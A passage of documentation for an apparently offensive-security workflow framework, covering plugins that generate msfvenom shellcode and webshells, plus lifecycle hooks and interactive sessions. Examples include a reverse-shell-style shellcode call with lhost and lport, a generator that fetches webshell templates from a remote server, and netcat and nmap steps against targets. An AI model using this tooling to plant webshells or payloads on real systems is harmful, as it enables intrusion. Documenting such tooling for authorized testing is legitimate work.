valid_archs:\n            raise ValueError(f\"Invalid arch: {arch}. Must be one of {valid_archs}\")\n\n        valid_formats = [\"raw\", \"hex\", \"base64\", \"c\"]\n        if format not in valid_formats:\n            raise ValueError(f\"Invalid format: {format}. Must be one of {valid_formats}\")\n</code></pre>"},{"location":"guide/extending-data-modules/#registering-the-connector","title":"Registering the Connector","text":"<p>Add your connector to <code>data/shellcode/connectors/__init__.py</code>:</p> <pre><code>from ofx.data.shellcode.connectors.base import ShellcodeConnector\nfrom ofx.data.shellcode.connectors.msfvenom import MsfvenomConnector\nfrom ofx.data.shellcode.connectors.custom_connector import CustomShellcodeConnector\n\n# Export all connectors\n__all__ = [\n    \"ShellcodeConnector\",\n    \"MsfvenomConnector\", \n    \"CustomShellcodeConnector\",\n]\n\n# Registry for auto-discovery\nCONNECTORS = {\n    \"msfvenom\": MsfvenomConnector,\n    \"custom-tool\": CustomShellcodeConnector,\n}\n</code></pre>"},{"location":"guide/extending-data-modules/#extending-webshell-connectors","title":"Extending Webshell Connectors","text":""},{"location":"guide/extending-data-modules/#base-connector-interface_1","title":"Base Connector Interface","text":"<p>All webshell connectors inherit from <code>WebshellConnector</code>:</p> <pre><code>from abc import ABC, abstractmethod\nfrom typing import Optional\n\nclass WebshellConnector(ABC):\n    \"\"\"Abstract base class for webshell generation connectors.\"\"\"\n\n    def __init__(self, name: str, description: str = \"\"):\n        self.name = name\n        self.description = description\n        self.available = self.check_available()\n\n    @abstractmethod\n    def generate(\n        self,\n        language: str,\n        password: str = \"pass\",\n        encoder: str = \"default\",\n        secret_header: Optional[str] = None,\n        secret_value: Optional[str] = None,\n        inline: bool = False,\n        **kwargs\n    ) -&gt; str:\n        \"\"\"Generate webshell code.\n\n        Args:\n            language: Target language (php, jsp, aspx, etc.)\n            password: Authentication password\n            encoder: Encoding/obfuscation method\n            secret_header: Optional HTTP header for authentication\n            secret_value: Value for secret header\n            inline: Generate inline/one-liner code\n            **kwargs: Additional connector-specific parameters\n\n        Returns:\n            Generated webshell code as string\n        \"\"\"\n        pass\n\n    def check_available(self) -&gt; bool:\n        \"\"\"Check if connector is available.\"\"\"\n        return True\n\n    def validate_params(self, language: str, password: str, encoder: str) -&gt; None:\n        \"\"\"Validate generation parameters.\"\"\"\n        pass\n</code></pre>"},{"location":"guide/extending-data-modules/#creating-a-custom-webshell-connector","title":"Creating a Custom Webshell Connector","text":"<p>Create a new file in <code>data/webshell/connectors/</code>:</p> <pre><code># src/ofx/data/webshell/connectors/advanced_connector.py\n\nfrom typing import Optional\nfrom ofx.data.webshell.connectors.base import WebshellConnector\nimport requests\n\nclass AdvancedWebshellConnector(WebshellConnector):\n    \"\"\"Advanced webshell generator with remote templates.\"\"\"\n\n    def __init__(self):\n        super().__init__(\n            name=\"advanced-generator\",\n            description=\"Advanced webshell with remote template support\"\n        )\n        self.base_url = \"https://your-template-server.com/api\"\n\n    def generate(\n        self,\n        language: str,\n        password: str = \"pass\",\n        encoder: str = \"base64\",\n        secret_header: Optional[str] = None,\n        secret_value: Optional[str] = None,\n        inline: bool = False,\n        **kwargs\n    ) -&gt; str:\n        \"\"\"Generate webshell from remote template.\"\"\"\n\n        self.validate_params(language, password, encoder)\n\n        # Fetch template from remote server\n        template_code = self._fetch_template(language, encoder)\n\n        # Apply customizations\n        code = self._customize_template(\n            template_code,\n            password=password,\n            secret_header=secret_header,\n            secret_value=secret_value,\n        )\n\n        # Optionally minify/inline\n        if inline:\n            code = self._minify(code)\n\n        return code\n\n    def _fetch_template(self, language: str, encoder: str) -&gt; str:\n        \"\"\"Fetch template from remote server.\"\"\"\n        response = requests.get(\n            f\"{self.base_url}/template\",\n            params={\"lang\": language, \"encoder\": encoder},\n            timeout=10\n        )\n        response.raise_for_status()\n        return response.text\n\n    def _customize_template(\n        self,\n        template: str,\n        password: str,\n        secret_header: Optional[str],\n        secret_value: Optional[str],\n    ) -&gt; str:\n        \"\"\"Apply customizations to template.\"\"\"\n        code = template.replace(\"{{PASSWORD}}\", password)\n\n        if secret_header and secret_value:\n            auth_check = f\"\"\"\n            if ($_SERVER['HTTP_{secret_header.upper().replace('-', '_')}'] !== '{secret_value}') {{\n                http_response_code(404);\n                exit;\n            }}\n            \"\"\"\n            code = auth_check + code\n\n        return code\n\n    def _minify(self, code: str) -&gt; str:\n        \"\"\"Minify code to single line.\"\"\"\n        return \" \".join(line.strip() for line in code.splitlines() if line.strip())\n\n    def validate_params(self, language: str, password: str, encoder: str) -&gt; None:\n        \"\"\"Validate parameters.\"\"\"\n        valid_languages = [\"php\", \"jsp\", \"aspx\", \"asp\"]\n        if language not in valid_languages:\n            raise ValueError(f\"Unsupported language: {language}\")\n\n        if len(password) &lt; 4:\n            raise ValueError(\"Password must be at least 4 characters\")\n</code></pre>"},{"location":"guide/extending-data-modules/#registering-the-webshell-connector","title":"Registering the Webshell Connector","text":"<p>Add to <code>data/webshell/connectors/__init__.py</code>:</p> <pre><code>from ofx.data.webshell.connectors.base import WebshellConnector\nfrom ofx.data.webshell.connectors.template import TemplateConnector\nfrom ofx.data.webshell.connectors.advanced_connector import AdvancedWebshellConnector\n\n__all__ = [\n    \"WebshellConnector\",\n    \"TemplateConnector\",\n    \"AdvancedWebshellConnector\",\n]\n\nCONNECTORS = {\n    \"template\": TemplateConnector,\n    \"advanced\": AdvancedWebshellConnector,\n}\n</code></pre>"},{"location":"guide/extending-data-modules/#using-custom-connectors","title":"Using Custom Connectors","text":""},{"location":"guide/extending-data-modules/#in-python-code","title":"In Python Code","text":"<pre><code>from ofx.data.shellcode.connectors import CONNECTORS as shellcode_connectors\nfrom ofx.data.webshell.connectors import CONNECTORS as webshell_connectors\n\n# Use shellcode connector\nconnector = shellcode_connectors[\"custom-tool\"]()\nif connector.available:\n    shellcode = connector.generate(\n        arch=\"x64\",\n        format=\"raw\",\n        lhost=\"192.168.1.100\",\n        lport=4444\n    )\n    print(f\"Generated {len(shellcode)} bytes\")\n\n# Use webshell connector  \nconnector = webshell_connectors[\"advanced\"]()\nwebshell = connector.generate(\n    language=\"php\",\n    password=\"secret123\",\n    encoder=\"base64\",\n    inline=True\n)\nprint(webshell)\n</code></pre>"},{"location":"guide/extending-data-modules/#in-workflows","title":"In Workflows","text":"<p>Reference connectors in workflow YAML:</p> <pre><code>jobs:\n  generate_payload:\n    steps:\n      - name: Generate shellcode\n        run: |\n          from ofx.data.shellcode.connectors import CONNECTORS\n          connector = CONNECTORS[\"custom-tool\"]()\n          shellcode = connector.generate(\n            arch=\"x64\",\n            lhost=\"{{ secrets.lhost }}\",\n            lport=4444\n          )\n          with open(\"payload.bin\", \"wb\") as f:\n              f.write(shellcode)\n\n      - name: Generate webshell\n        run: |\n          from ofx.data.webshell.connectors import CONNECTORS\n          connector = CONNECTORS[\"advanced\"]()\n          code = connector.generate(\n            language=\"php\",\n            password=\"{{ secrets.webshell_pass }}\"\n          )\n          print(f\"webshell={code}\")\n        outputs:\n          webshell: \"{{ step.webshell }}\"\n</code></pre>"},{"location":"guide/extending-data-modules/#best-practices","title":"Best Practices","text":""},{"location":"guide/extending-data-modules/#error-handling","title":"Error Handling","text":"<p>Always validate inputs and handle errors gracefully:</p> <pre><code>def generate(self, arch: str, **kwargs) -&gt; bytes:\n    try:\n        self.validate_params(arch, kwargs.get(\"format\", \"raw\"))\n        return self._do_generate(arch, **kwargs)\n    except ValueError as e:\n        raise ValueError(f\"Invalid parameters: {e}\")\n    except subprocess.CalledProcessError as e:\n        raise RuntimeError(f\"Generation failed: {e.stderr.decode()}\")\n    except Exception as e:\n        raise RuntimeError(f\"Unexpected error: {e}\")\n</code></pre>"},{"location":"guide/extending-data-modules/#dependency-checking","title":"Dependency Checking","text":"<p>Check for required tools/libraries:</p> <pre><code>def check_available(self) -&gt; bool:\n    \"\"\"Check if required dependencies are available.\"\"\"\n    # Check for command-line tools\n    if not shutil.which(\"required-tool\"):\n        return False\n\n    # Check for Python modules\n    try:\n        import required_module\n        return True\n    except ImportError:\n        return False\n</code></pre>"},{"location":"guide/extending-data-modules/#logging","title":"Logging","text":"<p>Use logging for debugging:</p> <pre><code>import logging\n\nlogger = logging.getLogger(__name__)\n\ndef generate(self, arch: str, **kwargs) -&gt; bytes:\n    logger.debug(f\"Generating shellcode for {arch}\")\n    result = self._do_generate(arch, **kwargs)\n    logger.info(f\"Generated {len(result)} bytes of shellcode\")\n    return result\n</code></pre>"},{"location":"guide/extending-data-modules/#testing","title":"Testing","text":"<p>Create tests for your connectors:</p> <pre><code># tests/test_custom_connector.py\n\nimport pytest\nfrom ofx.data.shellcode.connectors.custom_connector import CustomShellcodeConnector\n\ndef test_connector_available():\n    connector = CustomShellcodeConnector()\n    # Test should adapt based on whether tool is installed\n    assert isinstance(connector.available, bool)\n\ndef test_generate_shellcode():\n    connector = CustomShellcodeConnector()\n    if not connector.available:\n        pytest.skip(\"Connector not available\")\n\n    shellcode = connector.generate(\n        arch=\"x64\",\n        format=\"raw\",\n        lhost=\"127.0.0.1\",\n        lport=4444\n    )\n    assert isinstance(shellcode, bytes)\n    assert len(shellcode) &gt; 0\n\ndef test_invalid_arch():\n    connector = CustomShellcodeConnector()\n    with pytest.raises(ValueError):\n        connector.generate(arch=\"invalid\", format=\"raw\")\n</code></pre>"},{"location":"guide/extending-data-modules/#additional-resources","title":"Additional Resources","text":"<ul> <li>Shellcode API Documentation</li> <li>Webshell API Documentation</li> <li>Workflow Integration</li> <li>Template System</li> </ul>"},{"location":"guide/hooks/","title":"Hooks System","text":"<p>The hook system allows you to execute custom code at various lifecycle points during workflow, job, and step execution. Hooks propagate conditionally through the execution hierarchy.</p>"},{"location":"guide/hooks/#hook-types","title":"Hook Types","text":""},{"location":"guide/hooks/#lifecycle-hooks","title":"Lifecycle Hooks","text":"<p>Execute at specific points in the execution lifecycle:</p> <ul> <li><code>before_init</code> - Before initialization</li> <li><code>on_init</code> - During initialization</li> <li><code>on_start</code> - When execution starts</li> <li><code>on_iter</code> - On each iteration (for loops)</li> <li><code>on_end</code> - When execution ends</li> <li><code>before_run</code> - Before running</li> <li><code>after_run</code> - After running</li> </ul>"},{"location":"guide/hooks/#status-hooks","title":"Status Hooks","text":"<p>Execute based on execution status:</p> <ul> <li><code>on_success</code> - When execution succeeds</li> <li><code>on_failure</code> - When execution fails</li> <li><code>on_error</code> - When an error occurs</li> <li><code>on_cancel</code> - When execution is cancelled</li> </ul>"},{"location":"guide/hooks/#command-hooks","title":"Command Hooks","text":"<p>Execute during command execution:</p> <ul> <li><code>on_cmd</code> - Before command execution</li> <li><code>on_cmd_done</code> - After command completion</li> <li><code>on_line</code> - For each line of output</li> </ul>"},{"location":"guide/hooks/#hook-structure","title":"Hook Structure","text":"<pre><code>hooks:\n  hook_name:\n    script: \"script content\"\n</code></pre>"},{"location":"guide/hooks/#single-line-hook","title":"Single-line Hook","text":"<pre><code>hooks:\n  on_start:\n    script: echo \"Starting execution\"\n    language: shell\n</code></pre>"},{"location":"guide/hooks/#multi-line-hook","title":"Multi-line Hook","text":"<pre><code>hooks:\n  on_success:\n    script: |\n      import datetime\n      print(f\"Completed at {datetime.now()}\")\n      print(f\"Duration: {ctx.duration} seconds\")\n</code></pre>"},{"location":"guide/hooks/#hook-propagation","title":"Hook Propagation","text":"<p>Hooks propagate conditionally through the hierarchy: Step \u2192 Job \u2192 Workflow</p>"},{"location":"guide/hooks/#propagation-rules","title":"Propagation Rules","text":"<ol> <li>Step with hooks: Step hooks execute, then propagate to Job, then Workflow</li> <li>Step without hooks: Job hooks execute, then propagate to Workflow</li> <li>Job without hooks: Only Workflow hooks execute</li> </ol>"},{"location":"guide/hooks/#example","title":"Example","text":"<pre><code>name: Hook Propagation Example\n\nhooks:\n  on_start:\n    script: echo \"Workflow started\"  # Executes for all\n    language: shell\n\njobs:\n  job1:\n    hooks:\n      on_start:\n        script: echo \"Job1 started\"  # Executes + propagates to workflow\n        language: shell\n    steps:\n      - name: Step with hook\n        run: echo \"Hello\"\n        hooks:\n          on_start:\n            script: echo \"Step started\"  # Executes + propagates to job + workflow\n            language: shell\n\n      - name: Step without hook\n        run: echo \"World\"\n        # Job hook executes + propagates to workflow\n</code></pre> <p>Execution order for first step: 1. Step's <code>on_start</code> hook 2. Job's <code>on_start</code> hook (propagated) 3. Workflow's <code>on_start</code> hook (propagated) 4. Step executes 5. Hooks in reverse for <code>on_end</code></p>"},{"location":"guide/hooks/#hook-scopes","title":"Hook Scopes","text":""},{"location":"guide/hooks/#workflow-level-hooks","title":"Workflow-Level Hooks","text":"<p>Apply to the entire workflow:</p> <pre><code>name: My Workflow\n\nhooks:\n  on_start:\n    script: |\n      print(\"=== Workflow Starting ===\")\n      print(f\"Target: {ctx.inputs['target']}\")\n      print(f\"Run ID: {ctx.run_id}\")\n\n  on_success:\n    script: python notify.py --status success --target ${{ inputs.target }}\n    language: shell\n\n  on_error:\n    script: |\n      import sys\n      print(f\"ERROR: {error}\", file=sys.stderr)\n      # Send alert\n      import requests\n      requests.post('https://alerts.example.com', json={'error': str(error)})\n    language: python\n\njobs:\n  # ... job definitions\n</code></pre>"},{"location":"guide/hooks/#job-level-hooks","title":"Job-Level Hooks","text":"<p>Apply to specific jobs:</p> <pre><code>jobs:\n  critical_scan:\n    hooks:\n      on_start:\n        script: echo \"Starting critical scan - alerting team\"\n        language: shell\n\n      on_failure:\n        script: python alert_team.py --severity high --job critical_scan\n        language: shell\n\n      on_success:\n        script: python log_success.py --job critical_scan\n        language: shell\n\n    steps:\n      - name: Scan\n        run: nmap -sV ${{ inputs.target }}\n</code></pre>"},{"location":"guide/hooks/#step-level-hooks","title":"Step-Level Hooks","text":"<p>Apply to individual steps:</p> <pre><code>steps:\n  - name: Critical operation\n    run: python critical.py\n    hooks:\n      on_start:\n        script: echo \"Starting critical operation at $(date)\"\n        language: shell\n\n      on_cmd:\n        script: |\n          print(f\"Executing command: {command}\")\n          print(f\"Working directory: {os.getcwd()}\")\n\n      on_line:\n        script: |\n          # Process each line of output\n          print(f\"OUTPUT: {line.strip()}\")\n\n      on_success:\n        script: echo \"Critical operation succeeded\"\n        language: shell\n\n      on_error:\n        script: |\n          print(f\"CRITICAL ERROR: {error}\")\n          # Emergency notification\n</code></pre>"},{"location":"guide/hooks/#available-context-in-hooks","title":"Available Context in Hooks","text":"<p>Hooks have access to execution context:</p>"},{"location":"guide/hooks/#python-hooks","title":"Python Hooks","text":"<pre><code>hooks:\n  on_start:\n    script: |\n      # Access context variables\n      print(f\"Run ID: {ctx.run_id}\")\n      print(f\"Inputs: {ctx.inputs}\")\n      print(f\"Secrets: {ctx.secrets}\")\n      print(f\"Output path: {ctx.output_path}\")\n      print(f\"Environment: {ctx.envs}\")\n\n      # For step hooks\n      print(f\"Step name: {step.name}\")\n      print(f\"Command: {step.run}\")\n\n      # For error hooks\n      print(f\"Error: {error}\")\n      print(f\"Error type: {type(error)}\")\n    language: python\n</code></pre>"},{"location":"guide/hooks/#shell-hooks","title":"Shell Hooks","text":"<pre><code>hooks:\n  on_start:\n    script: |\n      echo \"Target: ${{ inputs.target }}\"\n      echo \"Output: ${{ ctx.output_path }}\"\n      echo \"Run ID: ${{ ctx.run_id }}\"\n    language: shell\n</code></pre>"},{"location":"guide/hooks/#common-use-cases","title":"Common Use Cases","text":""},{"location":"guide/hooks/#1-logging-and-monitoring","title":"1. Logging and Monitoring","text":"<pre><code>hooks:\n  on_start:\n    script: |\n      import logging\n      logging.basicConfig(level=logging.INFO)\n      logger = logging.getLogger('workflow')\n      logger.info(f\"Workflow started: {ctx.inputs}\")\n    language: python\n\n  on_end:\n    script: |\n      import logging\n      logger = logging.getLogger('workflow')\n      logger.info(f\"Workflow completed in {ctx.duration}s\")\n    language: python\n</code></pre>"},{"location":"guide/hooks/#2-notifications","title":"2. Notifications","text":"<pre><code>hooks:\n  on_success:\n    script: |\n      import requests\n      requests.post(\n        'https://hooks.slack.com/services/YOUR/WEBHOOK/URL',\n        json={\n          'text': f'\u2705 Workflow completed successfully for {ctx.inputs[\"target\"]}'\n        }\n      )\n    language: python\n\n  on_error:\n    script: |\n      import requests\n      requests.post(\n        'https://hooks.slack.com/services/YOUR/WEBHOOK/URL',\n        json={\n          'text': f'\u274c Workflow failed: {error}'\n        }\n      )\n    language: python\n</code></pre>"},{"location":"guide/hooks/#3-resource-cleanup","title":"3. Resource Cleanup","text":"<pre><code>hooks:\n  on_end:\n    script: |\n      import os\n      import shutil\n\n      # Clean up temporary files\n      temp_dir = '/tmp/workflow_temp'\n      if os.path.exists(temp_dir):\n        shutil.rmtree(temp_dir)\n\n      # Close connections\n      # cleanup_resources()\n    language: python\n</code></pre>"},{"location":"guide/hooks/#4-pre-flight-checks","title":"4. Pre-flight Checks","text":"<pre><code>hooks:\n  before_run:\n    script: |\n      import os\n      import sys\n\n      # Check required tools\n      tools = ['nmap', 'curl', 'python3']\n      for tool in tools:\n        if os.system(f'which {tool} &gt; /dev/null 2&gt;&amp;1') != 0:\n          print(f\"ERROR: Required tool '{tool}' not found\")\n          sys.exit(1)\n\n      # Check network connectivity\n      if os.system('ping -c 1 8.8.8.8 &gt; /dev/null 2&gt;&amp;1') != 0:\n        print(\"ERROR: No network connectivity\")\n        sys.exit(1)\n\n      print(\"\u2713 All pre-flight checks passed\")\n    language: python\n</code></pre>"},{"location":"guide/hooks/#5-progress-tracking","title":"5. Progress Tracking","text":"<pre><code>jobs:\n  long_scan:\n    hooks:\n      on_line:\n        script: |\n          # Track progress from command output\n          import re\n\n          # Parse percentage from nmap output\n          match = re.search(r'(\\d+)% done', line)\n          if match:\n            progress = int(match.group(1))\n            print(f\"Progress: {progress}%\")\n\n            # Update external tracker\n            # update_progress(ctx.run_id, progress)\n\n    steps:\n      - name: Full port scan\n        run: nmap -p- -v ${{ inputs.target }}\n</code></pre>"},{"location":"guide/hooks/#6-metrics-collection","title":"6. Metrics Collection","text":"<pre><code>hooks:\n  on_start:\n    script: |\n      import time\n      ctx.start_time = time.time()\n    language: python\n\n  on_end:\n    script: |\n      import time\n      duration = time.time() - ctx.start_time\n\n      # Log metrics\n      metrics = {\n        'workflow': 'security_scan',\n        'target': ctx.inputs['target'],\n        'duration_seconds': duration,\n        'status': 'success' if success else 'failed'\n      }\n\n      # Send to metrics service\n      # send_metrics(metrics)\n      print(f\"Metrics: {metrics}\")\n    language: python\n</code></pre>"},{"location":"guide/hooks/#7-dynamic-configuration","title":"7. Dynamic Configuration","text":"<pre><code>hooks:\n  on_init:\n    script: |\n      import json\n\n      # Load dynamic configuration\n      with open('config.json') as f:\n        config = json.load(f)\n\n      # Update context\n      ctx.custom_config = config\n\n      # Modify inputs based on config\n      if config.get('aggressive_mode'):\n        ctx.inputs['scan_speed'] = 'aggressive'\n    language: python\n</code></pre>"},{"location":"guide/hooks/#8-conditional-execution","title":"8. Conditional Execution","text":"<pre><code>hooks:\n  before_run:\n    script: |\n      import datetime\n\n      # Only run during business hours\n      hour = datetime.datetime.now().hour\n      if hour &lt; 9 or hour &gt; 17:\n        print(\"Scan not allowed outside business hours (9-17)\")\n        sys.exit(1)\n\n      # Check if target is in allowed list\n      allowed = ['192.168.1.0/24', 'test.example.com']\n      if ctx.inputs['target'] not in allowed:\n        print(f\"Target {ctx.inputs['target']} not in allowed list\")\n        sys.exit(1)\n    language: python\n</code></pre>"},{"location":"guide/hooks/#hook-best-practices","title":"Hook Best Practices","text":""},{"location":"guide/hooks/#1-keep-hooks-focused","title":"1. Keep Hooks Focused","text":"<pre><code># Good - Single responsibility\nhooks:\n  on_start:\n    script: echo \"Workflow started at $(date)\"\n    language: shell\n\n  on_success:\n    script: python notify.py --status success\n    language: shell\n\n# Bad - Doing too much\nhooks:\n  on_start:\n    script: |\n      echo \"Starting\"\n      python setup.py\n      curl https://api.example.com\n      # ... 50 more lines\n    language: shell\n</code></pre>"},{"location":"guide/hooks/#2-handle-errors-gracefully","title":"2. Handle Errors Gracefully","text":"<pre><code>hooks:\n  on_error:\n    script: |\n      try:\n        # Attempt notification\n        send_alert(error)\n      except Exception as e:\n        # Don't let hook failure mask original error\n        print(f\"Hook notification failed: {e}\", file=sys.stderr)\n    language: python\n</code></pre>"},{"location":"guide/hooks/#3-use-appropriate-languages","title":"3. Use Appropriate Languages","text":"<pre><code># Shell for simple commands\nhooks:\n  on_start:\n    script: echo \"Starting at $(date)\"\n    language: shell\n\n# Python for complex logic\nhooks:\n  on_end:\n    script: |\n      import json\n      from datetime import datetime\n\n      report = {\n        'completed_at': datetime.now().isoformat(),\n        'duration': ctx.duration,\n        'status': 'success'\n      }\n\n      with open(f'{ctx.output_path}/report.json', 'w') as f:\n        json.dump(report, f, indent=2)\n    language: python\n</code></pre>"},{"location":"guide/hooks/#4-document-hook-behavior","title":"4. Document Hook Behavior","text":"<pre><code>hooks:\n  on_start:\n    # This hook validates the target is reachable before starting\n    # If validation fails, the workflow will not execute\n    script: |\n      import socket\n      try:\n        socket.gethostbyname('${{ inputs.target }}')\n        print(f\"\u2713 Target {ctx.inputs['target']} is reachable\")\n      except:\n        print(f\"\u2717 Target {ctx.inputs['target']} cannot be resolved\")\n        sys.exit(1)\n    language: python\n</code></pre>"},{"location":"guide/hooks/#5-avoid-side-effects-in-read-only-hooks","title":"5. Avoid Side Effects in Read-Only Hooks","text":"<pre><code># Good - on_line just observes\nhooks:\n  on_line:\n    script: |\n      if 'ERROR' in line:\n        print(f\"Warning: Error detected in output\")\n    language: python\n\n# Bad - on_line modifies state\nhooks:\n  on_line:\n    script: |\n      # Don't do this - race conditions!\n      with open('output.txt', 'a') as f:\n        f.write(line)\n    language: python\n</code></pre>"},{"location":"guide/hooks/#advanced-examples","title":"Advanced Examples","text":""},{"location":"guide/hooks/#multi-stage-deployment-with-hooks","title":"Multi-Stage Deployment with Hooks","text":"<pre><code>name: Multi-Stage Deployment\n\nhooks:\n  on_start:\n    script: python deployment_started.py --stage ${{ inputs.stage }}\n    language: shell\n\n  on_error:\n    script: |\n      import sys\n      print(f\"DEPLOYMENT FAILED AT STAGE: {ctx.current_job}\")\n      # Rollback logic\n      rollback_deployment(ctx.current_job)\n      sys.exit(1)\n    language: python\n\njobs:\n  validate:\n    hooks:\n      on_success:\n        script: echo \"\u2713 Validation passed\"\n        language: shell\n    steps:\n      - run: python validate_config.py\n\n  deploy_stage:\n    needs: [validate]\n    hooks:\n      on_start:\n        script: python pre_deploy_checks.py\n        language: shell\n      on_success:\n        script: python post_deploy_verify.py\n        language: shell\n    steps:\n      - run: kubectl apply -f deployment.yml\n\n  smoke_test:\n    needs: [deploy_stage]\n    hooks:\n      on_failure:\n        script: |\n          print(\"Smoke tests failed - initiating rollback\")\n          rollback()\n        language: python\n    steps:\n      - run: python smoke_tests.py\n</code></pre>"},{"location":"guide/hooks/#see-also","title":"See Also","text":"<ul> <li>Workflows - Workflow configuration</li> <li>Jobs &amp; Steps - Job and step configuration</li> <li>Templates - Template variables in hooks</li> </ul>"},{"location":"guide/interactive-mode/","title":"Interactive Mode Documentation","text":"<p>This documentation has been split into multiple focused modules for easier searching and referencing:</p> <ul> <li>Overview</li> <li>Usage</li> <li>Detection &amp; Execution</li> <li>Limitations</li> <li>Examples</li> <li>Best Practices</li> <li>Error Handling &amp; Troubleshooting</li> </ul> <p>Please see the above pages for details, YAML examples, and troubleshooting tips.</p>"},{"location":"guide/interactive-mode/#single-job-stage-detection","title":"Single-Job Stage Detection","text":"<p>The workflow runner automatically analyzes job dependencies and determines which jobs can run in parallel:</p> <pre><code>name: Interactive Mode Detection\n\njobs:\n  # Stage 1: job1 alone - interactive allowed\n  job1:\n    steps:\n      - name: Interactive Step\n        run: bash\n        interactive: true  # \u2713 Works - alone in stage\n\n  # Stage 2: job2 and job3 in parallel - interactive disabled\n  job2:\n    needs: job1\n    steps:\n      - name: Try Interactive\n        run: bash\n        interactive: true  # \u2717 Disabled - job3 runs in parallel\n\n  job3:\n    needs: job1\n    steps:\n      - name: Normal Step\n        run: echo \"parallel with job2\"\n\n  # Stage 3: job4 alone - interactive allowed again\n  job4:\n    needs: [job2, job3]\n    steps:\n      - name: Interactive Again\n        run: python3\n        interactive: true  # \u2713 Works - alone in stage\n</code></pre>"},{"location":"guide/interactive-mode/#execution-modes","title":"Execution Modes","text":"<p>Interactive Mode (interactive: true): - stdin/stdout/stderr connected to terminal - User can type input - Output appears in real-time - Perfect for shells, REPLs, debuggers</p> <p>Normal Mode (interactive: false or not specified): - Output captured and logged - No stdin input possible - Can run in parallel with other jobs - Default behavior</p>"},{"location":"guide/interactive-mode/#limitations","title":"Limitations","text":""},{"location":"guide/interactive-mode/#cannot-use-with-workflows","title":"Cannot Use With Workflows","text":"<p>Interactive mode does not work with nested workflows:</p> <pre><code>jobs:\n  nested:\n    steps:\n      - name: Won't Work\n        uses: ./other-workflow.yml\n        interactive: true  # \u26a0\ufe0f Warning: ignored for workflow steps\n</code></pre>"},{"location":"guide/interactive-mode/#parallel-jobs-disable-interactive","title":"Parallel Jobs Disable Interactive","text":"<p>If multiple jobs run in the same stage, interactive mode is automatically disabled:</p> <pre><code>jobs:\n  job1:\n    steps:\n      - run: bash\n        interactive: true  # Disabled if job2 runs in parallel\n\n  job2:  # No 'needs' - runs in parallel with job1\n    steps:\n      - run: echo \"parallel\"\n</code></pre> <p>Solution: Use job dependencies to ensure jobs run sequentially:</p> <pre><code>jobs:\n  job1:\n    steps:\n      - run: bash\n        interactive: true  # \u2713 Works\n\n  job2:\n    needs: job1  # Runs after job1 completes\n    steps:\n      - run: echo \"sequential\"\n</code></pre>"},{"location":"guide/interactive-mode/#practical-examples","title":"Practical Examples","text":""},{"location":"guide/interactive-mode/#exploit-development-workflow","title":"Exploit Development Workflow","text":"<pre><code>name: Interactive Exploit Development\n\njobs:\n  setup:\n    steps:\n      - name: Prepare Environment\n        run: |\n          mkdir -p /tmp/exploit\n          cd /tmp/exploit\n\n  exploit:\n    needs: setup\n    steps:\n      - name: GDB Session\n        run: gdb ./vulnerable_binary\n        interactive: true\n        timeout: 30\n        working_directory: /tmp/exploit\n\n      - name: Save Findings\n        run: |\n          echo \"GDB session completed\" &gt; session.log\n        working_directory: /tmp/exploit\n</code></pre>"},{"location":"guide/interactive-mode/#database-testing","title":"Database Testing","text":"<pre><code>name: Database Interactive Session\n\njobs:\n  db_session:\n    steps:\n      - name: Connect to MySQL\n        run: mysql -h {{ inputs.db_host }} -u {{ inputs.db_user }} -p{{ secrets.db_pass }}\n        interactive: true\n        timeout: 15\n\n      - name: Export Results\n        run: mysqldump {{ inputs.db_name }} &gt; dump.sql\n</code></pre>"},{"location":"guide/interactive-mode/#network-tool-interaction","title":"Network Tool Interaction","text":"<pre><code>name: Netcat Session\n\njobs:\n  netcat:\n    steps:\n      - name: Interactive Netcat\n        run: nc {{ inputs.target_ip }} {{ inputs.target_port }}\n        interactive: true\n        timeout: 10\n\n      - name: Log Connection\n        run: echo \"Connection to {{ inputs.target_ip }}:{{ inputs.target_port }} completed\"\n</code></pre>"},{"location":"guide/interactive-mode/#python-script-development","title":"Python Script Development","text":"<pre><code>name: Interactive Python Testing\n\njobs:\n  test_script:\n    steps:\n      - name: Run IPython\n        run: ipython3\n        interactive: true\n        env:\n          PYTHONPATH: /path/to/modules\n\n      - name: Save Session History\n        run: cp ~/.ipython/profile_default/history.sqlite ipython_history.db\n</code></pre>"},{"location":"guide/interactive-mode/#best-practices","title":"Best Practices","text":""},{"location":"guide/interactive-mode/#set-appropriate-timeouts","title":"Set Appropriate Timeouts","text":"<p>Always set timeouts for interactive sessions to prevent hanging:</p> <pre><code>- name: Interactive Session\n  run: bash\n  interactive: true\n  timeout: 15  # 15 minutes timeout\n</code></pre>"},{"location":"guide/interactive-mode/#use-for-debugging","title":"Use for Debugging","text":"<p>Interactive mode is perfect for debugging workflow issues:</p> <pre><code>jobs:\n  debug:\n    steps:\n      - name: Run Commands\n        run: |\n          ./setup.sh\n          ./process.sh\n\n      - name: Debug Session\n        run: bash\n        interactive: true\n        run_if: failure()  # Only run if previous step failed\n</code></pre>"},{"location":"guide/interactive-mode/#combine-with-hooks","title":"Combine with Hooks","text":"<p>Use hooks to prepare the environment before interactive sessions:</p> <pre><code>jobs:\n  interactive_session:\n    hooks:\n      on_start:\n        run: echo \"Starting interactive session...\"\n        language: shell\n\n    steps:\n      - name: Interactive Tool\n        run: ./custom_tool\n        interactive: true\n</code></pre>"},{"location":"guide/interactive-mode/#sequential-dependencies","title":"Sequential Dependencies","text":"<p>Ensure interactive jobs run sequentially:</p> <pre><code>jobs:\n  prepare:\n    steps:\n      - run: ./prepare.sh\n\n  interact:\n    needs: prepare  # Sequential execution\n    steps:\n      - run: bash\n        interactive: true\n\n  cleanup:\n    needs: interact  # Runs after interaction\n    steps:\n      - run: ./cleanup.sh\n</code></pre>"},{"location":"guide/interactive-mode/#error-handling-exit-codes","title":"Error Handling &amp; Exit Codes","text":"<p>OFX handles interactive shell exits gracefully:</p> <ul> <li>Exit (exit/quit/close shell): Exiting the shell (typing <code>exit</code>, <code>Ctrl+D</code>, or closing the terminal) is treated as a clean exit. The workflow continues to the next step or job.</li> <li>Ctrl+C (SIGINT): Pressing <code>Ctrl+C</code> in an interactive session (exit code 130) is also treated as a clean exit.</li> <li>Command Not Found (127): If you type a command that does not exist, the shell will show an error, but exiting the shell itself is not an error.</li> <li>Other Errors: Any other nonzero exit code is treated as a failure and will stop the job unless <code>continue_on_error: true</code> is set.</li> </ul>"},{"location":"guide/interactive-mode/#example-handling-shell-exit","title":"Example: Handling Shell Exit","text":"<pre><code>jobs:\n  interactive_shell:\n    steps:\n      - name: Start Interactive Bash\n        run: bash\n        interactive: true\n        timeout: 10\n      - name: After Shell\n        run: echo \"Shell session ended cleanly!\"\n</code></pre> <p>If you type 